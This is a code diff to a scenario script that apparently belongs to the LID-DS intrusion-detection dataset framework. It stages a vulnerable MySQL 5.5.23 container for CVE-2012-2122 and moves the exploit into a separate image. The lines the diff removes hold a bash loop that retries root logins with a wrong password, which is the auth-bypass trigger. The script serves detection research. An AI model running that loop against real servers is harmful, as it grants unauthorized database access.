@@ -6,6 +6,8 @@ import pymysql
 
 from lid_ds.core import Scenario
 from lid_ds.core.collector.json_file_store import JSONFileStorage
+from lid_ds.core.image import StdinCommand, Image
+from lid_ds.utils.docker_utils import get_host_port
 
 warmup_time = int(sys.argv[1])
 recording_time = int(sys.argv[2])
@@ -21,25 +23,18 @@ min_user_count = 10
 max_user_count = 25
 user_count = random.randint(min_user_count, max_user_count)
 
-# TODO: enable dynamic ports
 
 class CVE_2012_2122(Scenario):
-    def exploit(self, container):
-        subprocess.Popen(r'''#!/bin/bash
-                for i in `seq 1 1000`;
-                do
-                    mysql -uroot -pwrong -h 127.0.0.1 -P3306 2>/dev/null;
-                done''', shell=True, executable='/bin/bash')
-
-    def init_victim(self):
+    def init_victim(self, container):
+        port = get_host_port(container, "3306")
         try:
-            db = pymysql.connect("localhost", "root", "123456")
+            db = pymysql.connect("localhost", "root", "123456", port=port)
             try:
                 db.cursor().execute('create database ' + "textDB")
             except:
                 pass
 
-            self.db = pymysql.connect("localhost", "root", "123456", "textDB")
+            self.db = pymysql.connect("localhost", "root", "123456", "textDB", port)
             sql = """CREATE TABLE `texts` (
                          `id` int(11) NOT NULL AUTO_INCREMENT, 
                          `text` varchar(255) COLLATE utf8_bin NOT NULL, 
@@ -53,38 +48,35 @@ class CVE_2012_2122(Scenario):
 
     def wait_for_availability(self, container):
         try:
-            db = pymysql.connect("localhost", "root", "123456")
-        except Exception:
+            db = pymysql.connect("localhost", "root", "123456", port=get_host_port(container, "3306"))
+        except Exception as e:
             return False
         return True
 
 
 storage_services = [JSONFileStorage()]
 
+victim = Image('vulhub/mysql:5.5.23')
+exploit = Image("exploit_mysql", command="sh /app/exploit.sh ${victim}")
+normal = Image("normal_mysql", command=StdinCommand(""), init_args="${victim} root 123456")
 
 if do_exploit:
     scenario_normal = CVE_2012_2122(
-        image_name='vulhub/mysql:5.5.23',
-        exploit_image_name="exploit_mysql",
-        normal_image_name="normal_mysql",
-        port_mapping={
-            '3306/tcp': 3306
-        },
+        victim=victim,
+        normal=normal,
+        exploit=exploit,
         user_count=1,
         warmup_time=warmup_time,
         recording_time=recording_time,
         storage_services=storage_services,
-        exploit_start_time=exploit_time,
+        exploit_start_time=exploit_time
     )
 else:
     scenario_normal = CVE_2012_2122(
-        image_name='vulhub/mysql:5.5.23',
-        exploit_image_name="python:alpine",
-        normal_image_name="normal_mysql",
-        port_mapping={
-            '3306/tcp': 3306
-        },
-        user_count=2,
+        victim=victim,
+        normal=normal,
+        exploit=exploit,
+        user_count=1,
         warmup_time=warmup_time,
         recording_time=recording_time,
         storage_services=storage_services,
